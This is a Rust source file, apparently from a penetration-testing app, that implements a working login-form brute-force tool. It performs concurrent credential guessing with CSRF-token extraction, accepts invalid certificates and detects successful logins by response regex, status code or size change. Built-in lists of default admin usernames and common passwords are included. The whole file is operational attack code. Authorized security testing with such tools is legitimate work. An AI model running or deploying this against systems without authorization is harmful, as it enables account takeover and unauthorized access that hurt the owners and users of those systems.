// ===================================================================
// Form Bruter — POST/GET login bruteforce with regex success/fail detection.
//
// Body template supports {USER} and {PASS} placeholders.
// Also supports {CSRF} — auto-extracted from a "priming" GET request.
//
// Success detection (in order, first matching rule wins):
//   1. success_regex  — regex matching response body
//   2. fail_regex     — regex matching response body (miss = hit)
//   3. success_status — status code matches (e.g. 302)
//   4. content-length delta threshold
// ===================================================================

use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, Instant};

use futures::stream::{self, StreamExt};
use regex::Regex;
use serde::{Deserialize, Serialize};
use crate::compat::{AppHandle, Emitter};
use tokio::sync::Semaphore;

#[derive(Debug, Clone, Deserialize)]
pub struct FormBruteRequest {
    pub url: String,
    #[serde(default = "default_method")]
    pub method: String,
    /// Body template (or query if method=GET). Ex: `user={USER}&pass={PASS}`
    pub body_template: String,
    #[serde(default)]
    pub headers: HashMap<String, String>,

    pub users: Vec<String>,
    pub passwords: Vec<String>,

    /// Attack mode: "clusterbomb" (cart. product, default) or "pitchfork" (lockstep pairs).
    #[serde(default = "default_mode")]
    pub mode: String,

    /// Prime URL — optional GET first to pick up cookies / CSRF token.
    #[serde(default)]
    pub prime_url: Option<String>,
    /// Regex to extract CSRF token from priming response. Use capture group 1.
    #[serde(default)]
    pub csrf_regex: Option<String>,
    #[allow(dead_code)]
    #[serde(default = "default_csrf_field")]
    pub csrf_field: String, // placeholder name in body template, default {CSRF}

    /// Success / failure detection (any match hits).
    #[serde(default)]
    pub success_regex: Option<String>,
    #[serde(default)]
    pub fail_regex: Option<String>,
    #[serde(default)]
    pub success_status: Option<Vec<u16>>,
    /// If set, any response with body length outside baseline ± this delta is treated as success.
    #[serde(default)]
    pub size_delta_threshold: Option<i64>,

    pub concurrency: usize,
    pub timeout_ms: u64,
    #[serde(default)]
    pub follow_redirects: bool,
    #[serde(default)]
    pub stop_on_first: bool,
}

fn default_method() -> String { "POST".into() }
fn default_mode() -> String { "clusterbomb".into() }
fn default_csrf_field() -> String { "{CSRF}".into() }

#[derive(Debug, Clone, Serialize)]
pub struct FormBruteHit {
    pub user: String,
    pub pass: String,
    pub status: u16,
    pub size: u64,
    pub redirect: Option<String>,
    pub reason: String,
    pub time_ms: u128,
}

fn urlencode(s: &str) -> String {
    use std::fmt::Write;
    let mut out = String::new();
    for b in s.as_bytes() {
        match *b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(*b as char),
            _ => { let _ = write!(out, "%{:02X}", b); }
        }
    }
    out
}

fn substitute(template: &str, user: &str, pass: &str, csrf: &str) -> String {
    template
        .replace("{USER}", &urlencode(user))
        .replace("{PASS}", &urlencode(pass))
        .replace("{CSRF}", &urlencode(csrf))
        .replace("{USER_RAW}", user)
        .replace("{PASS_RAW}", pass)
}

pub async fn form_brute_run(app: AppHandle, req: FormBruteRequest) -> Result<Vec<FormBruteHit>, String> {
    let client = reqwest::ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_millis(req.timeout_ms))
        .redirect(if req.follow_redirects {
            reqwest::redirect::Policy::limited(5)
        } else {
            reqwest::redirect::Policy::none()
        })
        .cookie_store(true)
        .user_agent("Mozilla/5.0 (PocketPentester-FormBrute)")
        .build()
        .map_err(|e| e.to_string())?;

    // ---- priming: GET + CSRF extraction ----
    let mut csrf_val = String::new();
    if let Some(pu) = &req.prime_url {
        let _ = app.emit("brute:status", format!("priming {pu}"));
        match client.get(pu).send().await {
            Ok(resp) => {
                let body = resp.text().await.unwrap_or_default();
                if let Some(pattern) = &req.csrf_regex {
                    if let Ok(re) = Regex::new(pattern) {
                        if let Some(cap) = re.captures(&body) {
                            if let Some(m) = cap.get(1).or_else(|| cap.get(0)) {
                                csrf_val = m.as_str().to_string();
                                let _ = app.emit("brute:status", format!("csrf token extracted ({} chars)", csrf_val.len()));
                            }
                        }
                    }
                }
                if csrf_val.is_empty() && req.csrf_regex.is_some() {
                    let _ = app.emit("brute:status", "csrf regex did not match priming response");
                }
            }
            Err(e) => { let _ = app.emit("brute:status", format!("prime failed: {e}")); }
        }
    }

    // ---- baseline: 1 request with dummy creds to learn the "failure" size ----
    let baseline_body = substitute(&req.body_template, "baseline_xxxxxxxx", "baseline_yyyyyy", &csrf_val);
    let baseline_size: Option<i64> = {
        let mut b = client.request(
            reqwest::Method::from_bytes(req.method.as_bytes()).unwrap_or(reqwest::Method::POST),
            &req.url,
        );
        for (k, v) in &req.headers { b = b.header(k, v); }
        if req.method.to_uppercase() == "GET" {
            b = b.query(&parse_kv(&baseline_body));
        } else {
            b = b.header("Content-Type", "application/x-www-form-urlencoded").body(baseline_body);
        }
        match b.send().await {
            Ok(r) => {
                let txt = r.text().await.unwrap_or_default();
                Some(txt.len() as i64)
            }
            Err(_) => None,
        }
    };
    if let Some(bs) = baseline_size {
        let _ = app.emit("brute:status", format!("baseline fail response: {bs} bytes"));
    }

    // ---- build pairs ----
    let pairs: Vec<(String, String)> = match req.mode.as_str() {
        "pitchfork" => {
            let n = req.users.len().min(req.passwords.len());
            (0..n).map(|i| (req.users[i].clone(), req.passwords[i].clone())).collect()
        }
        _ => {
            let mut out = Vec::with_capacity(req.users.len() * req.passwords.len());
            for u in &req.users {
                for p in &req.passwords {
                    out.push((u.clone(), p.clone()));
                }
            }
            out
        }
    };

    let total = pairs.len();
    let _ = app.emit("brute:status", format!("attempting {total} combinations ({})", req.mode));

    // ---- compile regexes once ----
    let succ_re = req.success_regex.as_ref().and_then(|p| Regex::new(p).ok());
    let fail_re = req.fail_regex.as_ref().and_then(|p| Regex::new(p).ok());
    let succ_status: std::collections::HashSet<u16> = req.success_status.clone().unwrap_or_default().into_iter().collect();

    let sem = Arc::new(Semaphore::new(req.concurrency.max(1)));
    let done = Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let client = Arc::new(client);

    let csrf = csrf_val;
    let method = reqwest::Method::from_bytes(req.method.to_uppercase().as_bytes())
        .map_err(|e| format!("bad method: {e}"))?;

    let hits: Vec<FormBruteHit> = stream::iter(pairs.into_iter())
        .map(|(user, pass)| {
            let client = client.clone();
            let sem = sem.clone();
            let done = done.clone();
            let stop = stop.clone();
            let app = app.clone();
            let url = req.url.clone();
            let headers = req.headers.clone();
            let template = req.body_template.clone();
            let method = method.clone();
            let succ_re = succ_re.clone();
            let fail_re = fail_re.clone();
            let succ_status = succ_status.clone();
            let size_delta = req.size_delta_threshold;
            let csrf = csrf.clone();
            let stop_first = req.stop_on_first;
            async move {
                if stop.load(std::sync::atomic::Ordering::Relaxed) { return None; }
                let _permit = sem.acquire().await.unwrap();
                if stop.load(std::sync::atomic::Ordering::Relaxed) { return None; }

                let body = substitute(&template, &user, &pass, &csrf);
                let start = Instant::now();

                let mut builder = client.request(method.clone(), &url);
                for (k, v) in &headers { builder = builder.header(k, v); }
                if method == reqwest::Method::GET {
                    builder = builder.query(&parse_kv(&body));
                } else {
                    builder = builder.header("Content-Type", "application/x-www-form-urlencoded").body(body);
                }

                let resp = match builder.send().await {
                    Ok(r) => r,
                    Err(_) => {
                        let n = done.fetch_add(1, std::sync::atomic::Ordering::Relaxed) + 1;
                        let _ = app.emit("brute:progress", serde_json::json!({"done": n, "total": total}));
                        return None;
                    }
                };

                let status = resp.status().as_u16();
                let redirect = resp.headers().get("location")
                    .and_then(|v| v.to_str().ok()).map(String::from);
                let body_text = resp.text().await.unwrap_or_default();
                let size = body_text.len() as u64;
                let time_ms = start.elapsed().as_millis();

                let n = done.fetch_add(1, std::sync::atomic::Ordering::Relaxed) + 1;
                let _ = app.emit("brute:progress", serde_json::json!({"done": n, "total": total}));

                // detect success
                let mut reason = String::new();
                let mut matched = false;
                if let Some(re) = &succ_re {
                    if re.is_match(&body_text) { matched = true; reason = "success_regex matched".into(); }
                }
                if !matched {
                    if let Some(re) = &fail_re {
                        if !re.is_match(&body_text) { matched = true; reason = "fail_regex did NOT match".into(); }
                    }
                }
                if !matched && !succ_status.is_empty() && succ_status.contains(&status) {
                    matched = true; reason = format!("success_status matched ({status})");
                }
                if !matched {
                    if let (Some(delta), Some(bs)) = (size_delta, baseline_size) {
                        if (size as i64 - bs).abs() > delta {
                            matched = true;
                            reason = format!("size delta {} > {} (baseline {bs} vs {size})",
                                (size as i64 - bs).abs(), delta);
                        }
                    }
                }

                if matched {
                    let hit = FormBruteHit { user, pass, status, size, redirect, reason, time_ms };
                    let _ = app.emit("brute:hit", hit.clone());
                    if stop_first { stop.store(true, std::sync::atomic::Ordering::Relaxed); }
                    Some(hit)
                } else {
                    None
                }
            }
        })
        .buffer_unordered(req.concurrency.max(1))
        .filter_map(|x| async move { x })
        .collect()
        .await;

    let _ = app.emit("brute:done", hits.len());
    Ok(hits)
}

fn parse_kv(s: &str) -> Vec<(String, String)> {
    s.split('&').filter_map(|p| {
        let (k, v) = p.split_once('=')?;
        Some((k.to_string(), v.to_string()))
    }).collect()
}

pub fn form_brute_common_users() -> Vec<&'static str> {
    vec![
        "admin", "administrator", "root", "user", "test", "guest",
        "superadmin", "sysadmin", "operator", "supervisor", "manager",
        "support", "webmaster", "backup", "dev", "developer",
        "info", "info@", "contact", "sales", "moderator",
        "admin1", "admin2", "administrator1",
        "pentest", "oscp", "offsec",
        // common emails
        "admin@example.com", "test@test.com",
    ]
}

pub fn form_brute_common_passwords() -> Vec<&'static str> {
    vec![
        "admin", "admin123", "administrator", "password", "password123", "pass123",
        "12345", "123456", "1234567", "12345678", "123456789", "1234567890",
        "qwerty", "qwerty123", "abc123", "111111", "000000", "letmein",
        "welcome", "welcome1", "welcome123", "changeme", "changeme123",
        "root", "toor", "pass", "test", "demo", "guest",
        "default", "admin@123", "P@ssw0rd", "Password1", "P@ssword1",
        "iloveyou", "monkey", "dragon", "master", "football", "baseball",
        "Summer2023", "Summer2024", "Winter2024", "Autumn2024",
        "company123", "corp123", "Company2024",
        "admin2024", "password2024", "admin2023", "password2023",
    ]
}
